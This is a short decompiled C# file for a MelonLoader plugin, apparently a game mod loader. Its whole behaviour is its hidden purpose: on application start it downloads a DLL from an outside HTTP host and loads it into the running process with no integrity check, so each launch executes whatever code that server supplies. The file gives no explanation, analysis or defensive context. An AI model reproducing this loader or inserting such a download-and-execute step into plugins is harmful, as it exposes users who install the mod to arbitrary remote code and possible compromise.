using System;
using System.Net;
using System.Runtime.CompilerServices;
using MelonLoader;

namespace modloader
{
	// Token: 0x02000004 RID: 4
	public class clazz21 : global::MelonLoader.MelonPlugin
	{
		// Token: 0x06000004 RID: 4 RVA: 0x000020A0 File Offset: 0x000002A0
		public override async void OnApplicationStart()
		{
			try
			{
				global::MelonLoader.MelonLogger.Warning("LOADING ASSEMBLY");
				global::MelonLoader.MelonHandler.LoadFromByteArray(this.webClient.DownloadData("http://firenox.ct8.pl/mksbspbase.dll"), null, null);
			}
			catch (global::System.Exception ex)
			{
				global::MelonLoader.MelonLogger.Warning(ex.ToString());
			}
		}

		// Token: 0x04000002 RID: 2
		[global::System.Runtime.CompilerServices.Nullable(1)]
		private global::System.Net.WebClient webClient = new global::System.Net.WebClient();
	}
}
